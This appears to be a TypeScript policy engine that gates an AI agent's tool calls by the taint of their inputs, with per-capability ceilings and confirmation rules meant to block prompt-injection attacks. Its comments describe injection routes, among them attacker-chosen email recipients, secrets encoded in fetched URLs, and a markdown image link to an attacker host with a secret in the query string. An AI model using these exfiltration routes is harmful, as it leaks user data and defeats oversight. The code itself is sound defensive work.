// The truth table, and the engine that reads it. This is the whole library; everything else is
// plumbing around it.
//
// ONE TABLE, READ TWICE. `decide` and `checkContainment` both read CAPABILITY_POLICY. If the engine
// owned its own notion of what is permitted and the checker owned another, they would drift, and
// the checker would start certifying whatever the engine happened to do. That is the failure mode
// this whole library is arguing against, so it must not be the failure mode of the library itself.
//
// The drift is never random. It is asymmetric and always in the same direction: engines get
// loosened under delivery pressure. A customer needs file_write at UNTRUSTED_EXTERNAL for one
// workflow, the ceiling moves, the build goes red, and the checker gets loosened to match. With two
// tables that is two diffs, in two files, on two different days, and the second is indistinguishable
// from a bug fix. With one table it is a single reviewable line sitting next to the `rationale`
// string it now contradicts.
//
// WHAT THE ENGINE MAY NOT DO. `decide` contains no taint-level string literal. It compares only
// through `taintAtMost` and reads ceilings out of the row, so a threshold cannot be written down
// anywhere but this table. `test/contract.test.ts` fails the build if one appears.
//
// The engine is pure and synchronous: no clock, no randomness, no I/O, and it NEVER throws for any
// input including a malformed one. A policy engine that throws is a policy engine whose caller
// writes a try/catch, and that catch block is the bypass.

import {
  type ActionArg,
  type Capability,
  type Decision,
  type Effect,
  type EffectClass,
  type EgressClass,
  type ParamRole,
  type ProposedAction,
  type Provenance,
  type Reason,
  type ReasonCode,
  type ReceiptId,
  type Source,
  type SourceId,
  type Taint,
  type Verdict,
  joinTaint,
  taintAtMost,
  taintOf,
} from "./types.js";

// ---------------------------------------------------------------------------------------------
// Declassification rules, named. What each one can and cannot admit lives in declassify.ts.
// ---------------------------------------------------------------------------------------------

/** The named ways a value can be admitted above a ceiling. Causes, so `lower_snake`. */
export type DeclassificationRule =
  /** A human ratified this exact quoted value for this exact capability. */
  | "user_confirmed_value"
  /** The value is a member of a finite set fixed before any untrusted content was read. */
  | "allowlist_member"
  /** A number inside a bound whose endpoints are clean. */
  | "numeric_envelope"
  /** The value is an element selected out of a collection we already held cleanly. */
  | "clean_selection"
  /** The value is byte-identical to something we already held cleanly. */
  | "echo_of_clean";

/** Every rule, for iteration and exhaustiveness checks in tests. */
export const ALL_DECLASSIFICATION_RULES: readonly DeclassificationRule[] = [
  "user_confirmed_value",
  "allowlist_member",
  "numeric_envelope",
  "clean_selection",
  "echo_of_clean",
] as const;

// ---------------------------------------------------------------------------------------------
// The row
// ---------------------------------------------------------------------------------------------

/** A per-role ceiling. Absent roles fall back to the row's `defaultCeiling`. */
export type RoleCeilings = Partial<Readonly<Record<ParamRole, Taint>>>;

export interface CapabilityRow {
  /**
   * The row's own key. Redundant with its position in the record, and that redundancy is the point:
   * a copy-pasted row that forgets to change this is otherwise invisible, and `policy.test.ts`
   * asserts `CAPABILITY_POLICY[k].capability === k` for every k.
   */
  readonly capability: Capability;
  readonly effect: EffectClass;
  readonly egress: EgressClass;
  /** Ceiling for any role not named in `roleCeilings`. */
  readonly defaultCeiling: Taint;
  /** Per-argument ceilings. The mechanism that stops this library from being unusable. */
  readonly roleCeilings: RoleCeilings;
  /** Required regardless of taint. A property of the EFFECT axis, not the taint axis. */
  readonly requiresConfirmation: boolean;
  /**
   * Any ONE of these admits a value above the ceiling. EMPTY MEANS THE CEILING IS ABSOLUTE, and the
   * engine must answer DENY rather than NEEDS_DECLASSIFICATION - see the livelock note in `decide`.
   */
  readonly liftableBy: ReadonlySet<DeclassificationRule>;
  /** Quoted verbatim into refusals, so a denial carries the argument and not just a code. */
  readonly approvalBoundary: string;
}

export type CapabilityPolicy = Readonly<Record<Capability, CapabilityRow>>;

const lift = (...rules: DeclassificationRule[]): ReadonlySet<DeclassificationRule> =>
  new Set(rules);

/**
 * THE TABLE. Every threshold in the library is here and nowhere else.
 *
 * The two axes are genuinely orthogonal, and one cell proves it: `web_fetch` is
 * (effect none, egress full) and `account_modify` is (effect irreversible, egress metadata). Any
 * single sensitivity scale must order one above the other, and both orderings are wrong for a real
 * threat. Collapse to one axis and `web_fetch` sorts next to `text_response` - both harmless! -
 * which is exactly how the most common real exfiltration path gets waved through.
 */
export const CAPABILITY_POLICY: CapabilityPolicy = {
  // ---- effect none, egress none: untrusted content is SUPPOSED to reach here ------------------
  text_response: {
    capability: "text_response",
    effect: "none",
    egress: "none",
    // The top of the lattice, deliberately. This row is the thesis. A design that refuses to let
    // untrusted content reach a text answer has not contained anything, it has broken the product.
    // It is also the release valve that stops over-tainting from making the library unusable.
    //
    // The `egress: none` rating rests on ONE assumption that must be written down rather than
    // assumed: the rendering surface does not auto-fetch. A markdown client that resolves
    // ![](https://attacker/?secret) has turned this row into web_fetch, and then this row is wrong.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: {},
    requiresConfirmation: false,
    liftableBy: lift(),
    approvalBoundary: "Answers the user. Performs no tool call and sends nothing outward.",
  },

  read_only_tool: {
    capability: "read_only_tool",
    effect: "none",
    egress: "metadata",
    // Reading is free; exfiltration is not. An untrusted-directed read pulls data into context and
    // that feels like it should be gated - but gating it here gates the wrong thing, because
    // nothing changed and nothing left. The confidentiality risk is entirely downstream at the
    // egress capabilities, which is where it IS gated. Gate both and you get a system so
    // restrictive that the first production incident is somebody disabling it.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "TOOL_DERIVED", control: "TOOL_DERIVED" },
    requiresConfirmation: false,
    liftableBy: lift("allowlist_member", "clean_selection"),
    approvalBoundary: "Reads and returns. Changes nothing, but its arguments still leave a trace.",
  },

  transaction_prepare: {
    capability: "transaction_prepare",
    effect: "none",
    egress: "none",
    // Preparing is not acting. This row exists so the prepare/broadcast split is worth having: rate
    // them the same and the split buys nothing, so everyone collapses them into one call and the
    // agent ends up holding a signing key.
    //
    // The split invites exactly one catastrophic bug: PREPARATION DOES NOT LAUNDER TAINT. The
    // artifact a prepare produces carries the join of the inputs that produced it, and the
    // broadcast sees that join. Without that rule the two rows compose into a laundering pipeline.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: {},
    requiresConfirmation: false,
    liftableBy: lift(),
    approvalBoundary:
      "Builds an unsigned transaction for a human to inspect. Does not sign, submit, or grant " +
      "delegated authority.",
  },

  // ---- the row the two-axis model exists for --------------------------------------------------
  web_fetch: {
    capability: "web_fetch",
    effect: "none",
    egress: "full",
    // No side effect at all, and a complete exfiltration channel, because the URL IS the payload:
    // path, query, subdomain, and the DNS lookup itself.
    //
    // `requiresConfirmation` is false and that is NOT an oversight. A human cannot audit a URL for
    // a secret encoded in a path segment. Asking them produces a dialog that is always clicked
    // through, which is worse than no dialog because it manufactures consent. So this row is
    // liftable only by rules a machine can actually check.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "USER_CONTROLLED", control: "USER_CONTROLLED" },
    requiresConfirmation: false,
    liftableBy: lift("allowlist_member", "clean_selection", "echo_of_clean"),
    approvalBoundary: "Fetches a URL. The destination is chosen by whoever supplied it.",
  },

  file_write: {
    capability: "file_write",
    effect: "reversible",
    egress: "none",
    // The path is the risk; the bytes much less so. Writing a tool-produced summary to disk is the
    // normal case and denying it kills the product. Both ratings are conditional on the write
    // landing in a sandbox root that is not synced - a write into a web root or a shared drive is
    // full egress with extra steps.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    roleCeilings: { sink_identity: "USER_CONTROLLED", control: "USER_CONTROLLED" },
    requiresConfirmation: false,
    liftableBy: lift("user_confirmed_value", "allowlist_member", "echo_of_clean"),
    approvalBoundary: "Writes a file. The path decides what is overwritten.",
  },

  email_send: {
    capability: "email_send",
    effect: "irreversible",
    egress: "full",
    // THE ROLE ROW. A completely untrusted BODY sent to a recipient the user typed is the ordinary
    // use of an email assistant. A perfectly clean body sent to a recipient chosen by an inbound
    // email is a breach. One ceiling per capability cannot say that, forces you to declassify the
    // body, and gets the library removed in week three.
    defaultCeiling: "UNTRUSTED_EXTERNAL",
    // `magnitude` is rated EXPLICITLY even though `ceilingFor` would tighten it anyway. The fallback
    // is a backstop against an omission, not a substitute for stating the policy: a row should read
    // correctly to someone who does not know the fallback rule exists. This one was genuinely
    // missing - a policy invariant test caught it inheriting the permissive default, which is right
    // for a mail body and wrong for anything that steers the send (recipient count, attachment
    // size, a bulk flag).
    roleCeilings: {
      sink_identity: "USER_CONTROLLED",
      magnitude: "USER_CONTROLLED",
      control: "USER_CONTROLLED",
    },
    requiresConfirmation: false,
    liftableBy: lift("user_confirmed_value", "allowlist_member", "echo_of_clean"),
    approvalBoundary: "Sends mail. Unsend is a client-side illusion; treat it as irreversible.",
  },

  payment: {
    capability: "payment",
    effect: "irreversible",
    egress: "full",
    // Always confirms, even at CLEAN, and that is the row showing confirmation is not a taint gate.
    // `requiresConfirmation` is driven by the effect axis alone: a large transfer assembled
    // entirely from SYSTEM text still gets a human, because the failure being defended against
    // there is not injection, it is the agent being wrong.
    defaultCeiling: "TOOL_DERIVED",
    roleCeilings: { sink_identity: "USER_CONTROLLED", magnitude: "USER_CONTROLLED" },
    requiresConfirmation: true,
    liftableBy: lift("user_confirmed_value", "allowlist_member", "numeric_envelope"),
    approvalBoundary: "Moves money. There is no undo.",
  },

  account_modify: {
    capability: "account_modify",
    effect: "irreversible",
    egress: "metadata",
    // THE CONFUSED-DEPUTY ROW. This is the only capability that can change the policy under which
    // every FUTURE decision is made: rotate the recovery address and every subsequent confirmation
    // prompt goes to the attacker. A capability that can lower the ceiling on all other
    // capabilities cannot itself be gated by a liftable rule, because the lift is then a bootstrap.
    //
    // Note the egress rating is only `metadata` and this is still one of the two strictest rows. A
    // one-dimensional scale sorted on egress puts it below web_fetch, which is the second cell
    // proving the axes are orthogonal.
    defaultCeiling: "USER_CONTROLLED",
    roleCeilings: { sink_identity: "CLEAN", control: "CLEAN" },
    requiresConfirmation: true,
    liftableBy: lift(),
    approvalBoundary: "Changes keys, recovery, or permissions - including the ones guarding this.",
  },

  transaction_broadcast: {
    capability: "transaction_broadcast",
    effect: "irreversible",
    egress: "full",
    // Differs from wallet_sign by one fact that justifies them being separate capabilities: a
    // broadcast is SIMULATABLE. You can dry-run it and show a human the actual balance deltas, so a
    // human declassification here is meaningful.
    defaultCeiling: "USER_CONTROLLED",
    roleCeilings: { sink_identity: "CLEAN", magnitude: "CLEAN", control: "CLEAN" },
    requiresConfirmation: true,
    liftableBy: lift("user_confirmed_value"),
    approvalBoundary: "Submits a signed transaction. Once it lands it cannot be recalled.",
  },

  wallet_sign: {
    capability: "wallet_sign",
    effect: "irreversible",
    egress: "full",
    // THE STRICTEST ROW IN THE TABLE, stricter than payment, and it should be. A payment is
    // bounded: one amount, one recipient, one time. A signature is a UNIVERSAL, TRANSFERABLE
    // authorisation whose blast radius is not a function of its bytes - an unlimited-approval call
    // is a few dozen bytes, and a message signed for one chain replays on another.
    //
    // A declassification receipt is a claim about content. There is no claim about content that
    // bounds what a counterparty will do with a signature, so NOTHING lifts this row. If a workflow
    // needs to sign under taint, the answer is a narrower capability with its own row, not a
    // loosening of this one.
    defaultCeiling: "CLEAN",
    roleCeilings: {},
    requiresConfirmation: true,
    liftableBy: lift(),
    approvalBoundary: "Produces a signature. What a counterparty does with it is unbounded.",
  },
} as const;

/**
 * Roles that decide WHERE an action goes or HOW MUCH it moves, as opposed to what it carries.
 *
 * The distinction matters because an unrated steering role is a hole and an unrated payload role is
 * usually fine: an untrusted email body is the product, an untrusted recipient is the attack.
 */
const STEERING_ROLES: ReadonlySet<ParamRole> = new Set<ParamRole>([
  "sink_identity",
  "magnitude",
  "control",
]);

/**
 * The ceiling for one role of one capability.
 *
 * FAILING TO RATE A STEERING ROLE TIGHTENS IT, NEVER LOOSENS IT. An omitted steering role falls back
 * to the stricter of the row's default and `USER_CONTROLLED`, not to the default alone.
 *
 * This is not defensive tidiness, it is a bug that was actually in this table: `email_send` rates
 * `sink_identity` and leaves `magnitude` unrated, so it inherited the row's deliberately permissive
 * `UNTRUSTED_EXTERNAL` default - which is right for a mail body and wrong for anything that steers
 * the send. A policy invariant test caught it. Every row will eventually be edited by someone in a
 * hurry, and the direction an omission fails in is a design decision rather than an accident. Same
 * posture as the sibling scanner's per-program capability model: an undeclared capability is not
 * allowed, rather than allowed by default.
 */
export const ceilingFor = (row: CapabilityRow, role: ParamRole): Taint => {
  const explicit = row.roleCeilings[role];
  if (explicit !== undefined) return explicit;
  if (!STEERING_ROLES.has(role)) return row.defaultCeiling;
  return taintAtMost(row.defaultCeiling, "USER_CONTROLLED")
    ? row.defaultCeiling
    : "USER_CONTROLLED";
};

// ---------------------------------------------------------------------------------------------
// Input to the engine
// ---------------------------------------------------------------------------------------------

/** A receipt as the engine sees it. Issuing and validating one lives in declassify.ts. */
export interface ReceiptEvidence {
  readonly id: ReceiptId;
  readonly rule: DeclassificationRule;
  readonly capability: Capability;
  readonly role: ParamRole;
  /** The argument this receipt was issued for. A receipt is never a bearer token. */
  readonly argName: string;
  /** The highest taint this receipt admits. */
  readonly lifts: Taint;
}

export interface DecisionInput {
  readonly action: ProposedAction;
  /** Every origin in play. Model output must declare `derivedFrom`, or laundering is free. */
  readonly sources: readonly Source[];
  readonly receipts?: readonly ReceiptEvidence[];
  /** True when a human has confirmed this action. The shell owns the prompt; the engine does not. */
  readonly confirmed?: boolean;
}

// ---------------------------------------------------------------------------------------------
// The engine
// ---------------------------------------------------------------------------------------------

const reason = (code: ReasonCode, message: string, extra?: Partial<Reason>): Reason => ({
  code,
  message,
  ...(extra ?? {}),
});

/**
 * Resolve a source to its taint, following `derivedFrom` so model output inherits the join of
 * everything it was shown.
 *
 * Cycles are possible in a hostile or buggy integration, so the walk carries a seen-set and treats
 * a cycle as the top of the lattice. Failing closed on a malformed graph is the only safe answer,
 * and it is cheaper than trusting the caller not to build one.
 */
function resolveTaint(
  id: SourceId,
  byId: ReadonlyMap<string, Source>,
  seen: Set<string>,
): { readonly taint: Taint; readonly provenance: ReadonlySet<Provenance> } {
  const found = byId.get(id as string);
  if (found === undefined || seen.has(id as string)) {
    return { taint: "UNTRUSTED_EXTERNAL", provenance: new Set<Provenance>() };
  }
  seen.add(id as string);

  let taint = taintOf(found.provenance);
  const provenance = new Set<Provenance>([found.provenance]);

  for (const parent of found.derivedFrom ?? []) {
    const up = resolveTaint(parent, byId, seen);
    taint = joinTaint(taint, up.taint);
    for (const p of up.provenance) provenance.add(p);
  }
  return { taint, provenance };
}

/** Everything the engine learned about one argument. */
interface ArgAssessment {
  readonly arg: ActionArg;
  readonly taint: Taint;
  readonly provenance: ReadonlySet<Provenance>;
  readonly ceiling: Taint;
}

/**
 * Judge one proposed action.
 *
 * Pure, synchronous, reads no clock, generates no randomness, and never throws.
 *
 * PRECEDENCE, and each ordering is a decision rather than an accident:
 *
 *   1. unknown capability                                   -> DENY
 *   2. over ceiling, row is unliftable                      -> DENY
 *   3. over ceiling, a rule could lift it                   -> NEEDS_DECLASSIFICATION
 *   4. within ceiling, confirmation required and absent     -> NEEDS_REVIEW
 *   5. otherwise                                            -> ALLOW
 *
 * Step 2 before step 3 avoids a LIVELOCK. Answering NEEDS_DECLASSIFICATION on a row whose
 * `liftableBy` is empty asks for a receipt no rule can issue, so the request is unsatisfiable and a
 * persistent agent grinds against it until a budget runs out or a human gets tired and routes
 * around the control. `wallet_sign` and `account_modify` are exactly the two rows where that
 * matters, and exactly the two where an attacker has the most incentive to keep trying.
 *
 * Step 3 before step 4 keeps two different questions apart. Declassification asks "here is the raw
 * untrusted text, is this extracted value what you meant?". Confirmation asks "this moves money and
 * cannot be undone, proceed?". Prompting for confirmation while inputs are still undischarged asks
 * a human to launder taint by clicking, and both interactions look like a dialog, which is why the
 * conflation is so common.
 */
export function decide(
  input: DecisionInput,
  policy: CapabilityPolicy = CAPABILITY_POLICY,
): Verdict {
  const { action } = input;
  const row: CapabilityRow | undefined = policy[action.capability];
  const byId = new Map<string, Source>(input.sources.map((s) => [s.id as string, s]));

  // ---- unknown capability: a deployment fault, so fail closed rather than ask a human ----------
  if (row === undefined) {
    return {
      decision: "DENY",
      capability: action.capability,
      taint: "UNTRUSTED_EXTERNAL",
      provenance: new Set<Provenance>(),
      reasons: [
        reason(
          "unknown_capability",
          `no policy row for "${action.capability}"; an undeclared capability is denied`,
        ),
      ],
      effects: [{ type: "LOG_DECISION" }],
    };
  }

  // ---- assess every argument once --------------------------------------------------------------
  const assessments: ArgAssessment[] = [];
  const allProvenance = new Set<Provenance>();
  let overall: Taint = "CLEAN";

  for (const arg of action.args) {
    let taint: Taint = "CLEAN";
    const provenance = new Set<Provenance>();
    for (const from of arg.derivedFrom) {
      const r = resolveTaint(from, byId, new Set<string>());
      taint = joinTaint(taint, r.taint);
      for (const p of r.provenance) {
        provenance.add(p);
        allProvenance.add(p);
      }
    }
    overall = joinTaint(overall, taint);
    assessments.push({ arg, taint, provenance, ceiling: ceilingFor(row, arg.role) });
  }

  // ---- the taint gate, per argument -------------------------------------------------------------
  const reasons: Reason[] = [];
  const overCeiling = assessments.filter((a) => !taintAtMost(a.taint, a.ceiling));

  if (overCeiling.length > 0) {
    const unlifted: ArgAssessment[] = [];
    for (const a of overCeiling) {
      const covering = (input.receipts ?? []).find(
        (r) =>
          r.capability === action.capability &&
          r.role === a.arg.role &&
          r.argName === a.arg.name &&
          taintAtMost(a.taint, r.lifts) &&
          row.liftableBy.has(r.rule),
      );
      if (covering !== undefined) {
        reasons.push(
          reason("declassified", `"${a.arg.name}" admitted by ${covering.rule}`, {
            value: undefined,
          }),
        );
        continue;
      }
      unlifted.push(a);
    }

    if (unlifted.length > 0) {
      for (const a of unlifted) {
        // Both reasons, general fact first. `taint_exceeds_ceiling` is WHAT happened;
        // `egress_with_tainted_input` is WHY this particular argument is the dangerous one.
        // Emitting only the specific code loses the general one, and a grader that asked for the
        // general fact would then score a correct refusal as a miss - which is how a real
        // disagreement between the corpus and the engine surfaced during the first run of this
        // suite. Reasons are additive; there is no cost to saying both true things.
        reasons.push(
          reason(
            "taint_exceeds_ceiling",
            `"${a.arg.name}" (${a.arg.role}) is ${a.taint} but ${action.capability} admits at most ` +
              `${a.ceiling} there. ${row.approvalBoundary}`,
          ),
        );
        if (row.egress === "full" && a.arg.role === "sink_identity") {
          reasons.push(
            reason(
              "egress_with_tainted_input",
              `${action.capability} sends caller-chosen bytes outward and "${a.arg.name}" chose the destination`,
            ),
          );
        }
        if (row.effect === "irreversible") {
          reasons.push(reason("irreversible_effect", `${action.capability} cannot be undone`));
        }
      }

      // Unliftable row: DENY, not NEEDS_DECLASSIFICATION. See the livelock note above.
      if (row.liftableBy.size === 0) {
        return {
          decision: "DENY",
          capability: action.capability,
          taint: overall,
          provenance: allProvenance,
          reasons,
          effects: [{ type: "LOG_DECISION" }],
        };
      }

      reasons.push(
        reason(
          "declassification_available",
          `one of [${[...row.liftableBy].sort().join(", ")}] would admit this`,
        ),
      );
      return {
        decision: "NEEDS_DECLASSIFICATION",
        capability: action.capability,
        taint: overall,
        provenance: allProvenance,
        reasons,
        effects: [{ type: "LOG_DECISION" }],
      };
    }
  }

  // ---- mixed provenance ---------------------------------------------------------------------------
  // Evaluated HERE and not in the taint gate. Mixing is not a higher level - the join already
  // accounts for level - it is a statement about COMPOSITION: user intent stapled to attacker text.
  // Put it in the taint gate and a declassification receipt discharges it, which is wrong.
  //
  // MIXING IS PER-ARGUMENT AND PER-ROLE. Two narrowings, and each one was forced by a case that the
  // broader version got wrong.
  //
  // NOT PER-ACTION. Every useful agent task combines user intent with untrusted content - that is
  // what an agent IS - so an action-level test fires on essentially everything, and a prompt that
  // fires on everything is a click-through rather than a control. "Summarise this thread and send it
  // to alice@ourcorp.com" mixes at the action level and at no argument: the recipient is purely the
  // user's, the body purely the thread's. Holdout case email-h-002 is exactly this, and the
  // action-level version over-blocked it.
  //
  // AND ONLY FOR STEERING ROLES. A spliced PAYLOAD is the normal case - "save this summary", where
  // the content is part the user's words and part a fetched page - and escalating it is the second
  // way this rule over-blocks. What matters is a splice in an argument that decides WHERE the action
  // goes or HOW MUCH it moves.
  //
  // With the table as it currently stands this branch CANNOT FIRE, and that is a proven property
  // rather than an accident: `policy.test.ts` asserts that every steering role on a capability with
  // a real effect sits at or below USER_CONTROLLED, so any splice that would reach here has already
  // exceeded its ceiling and been refused. The check stays because it is the guard for a band that
  // is currently empty - loosen a steering ceiling and it activates on its own, and the invariant
  // test fails at the same time to say so. Deleting it would make a future loosening silent.
  const mixed = assessments.some((a) => {
    if (!STEERING_ROLES.has(a.arg.role)) return false;
    const classes = new Set<Taint>([...a.provenance].map(taintOf));
    return classes.size > 1;
  });
  if (mixed) {
    reasons.push(
      reason(
        "mixed_provenance",
        "an argument that steers this action was assembled from more than one trust class",
      ),
    );
  }

  // ---- the confirmation gate ------------------------------------------------------------------------
  if ((row.requiresConfirmation || (mixed && row.effect === "irreversible")) && !input.confirmed) {
    reasons.push(
      reason(
        "confirmation_required",
        `${action.capability} requires a human. ${row.approvalBoundary}`,
      ),
    );
    return {
      decision: "NEEDS_REVIEW",
      capability: action.capability,
      taint: overall,
      provenance: allProvenance,
      reasons,
      effects: [
        { type: "LOG_DECISION" },
        { type: "ESCALATE", summary: `${action.tool}: ${row.approvalBoundary}` },
      ],
    };
  }

  // ---- allow -----------------------------------------------------------------------------------------
  // A reason is pushed even here. An ALLOW with no reasons is indistinguishable from an ALLOW that
  // was never computed, which is exactly the artifact a lazy integration produces.
  reasons.push(
    reason("within_taint_ceiling", `every argument is within the ceiling for ${action.capability}`),
  );
  const effects: Effect[] = [{ type: "LOG_DECISION" }];
  return {
    decision: "ALLOW",
    capability: action.capability,
    taint: overall,
    provenance: allProvenance,
    reasons,
    effects,
  };
}

/** Convenience. Callers who only want the verdict word. */
export const decisionOf = (input: DecisionInput, policy?: CapabilityPolicy): Decision =>
  decide(input, policy).decision;
